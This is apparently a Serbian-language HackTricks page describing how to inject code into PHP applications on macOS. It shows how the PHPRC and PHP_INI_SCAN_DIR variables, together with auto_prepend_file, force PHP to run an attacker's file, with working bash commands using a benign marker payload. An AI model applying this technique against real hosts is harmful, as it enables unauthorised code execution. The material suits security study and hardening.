# PHP Applications Injection na macOS-u

{{#include ../../../banners/hacktricks-training.md}}

## `PHPRC` / `PHP_INI_SCAN_DIR` i `auto_prepend_file`

PHP CLI i CGI čitaju konfiguraciju pri svakom pokretanju. `PHPRC` može da izabere `php.ini` koji napadač može da čita, dok `PHP_INI_SCAN_DIR` može da preusmeri direktorijum koji se skenira za dodatne `.ini` fajlove. Direktiva `auto_prepend_file` omogućava PHP-u da parsira fajl pre zahtevane skripte, pa ova kombinacija dovodi do izvršavanja koda pri pokretanju.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
cat >/tmp/php-payload.php <<'PHP'
<?php file_put_contents('/tmp/php-prepend-executed', 'ok'); ?>
PHP
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/attacker-php.ini

PHPRC=/tmp/attacker-php.ini php victim.php
```
Alternativa je direktorijum koji sadrži `.ini` fajl:
```bash
mkdir -p /tmp/php-conf.d
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/php-conf.d/99-prepend.ini
PHP_INI_SCAN_DIR=/tmp/php-conf.d php victim.php
```
Opcija `-n` ignoriše `php.ini`; eksplicitno navedena pouzdana putanja za `-c` ima prednost u odnosu na `PHPRC`. Imajte na umu da dugotrajni server SAPI obično učitava konfiguraciju kada se web server pokrene, dok CLI i CGI to rade pri svakom pozivu.<sup>[[1]](#references)</sup>

## References

- [1] [PHP konfiguracioni fajl](https://www.php.net/manual/en/configuration.file.php)
- [2] [PHP `auto_prepend_file`](https://www.php.net/manual/en/ini.core.php#ini.auto-prepend-file)
{{#include ../../../banners/hacktricks-training.md}}
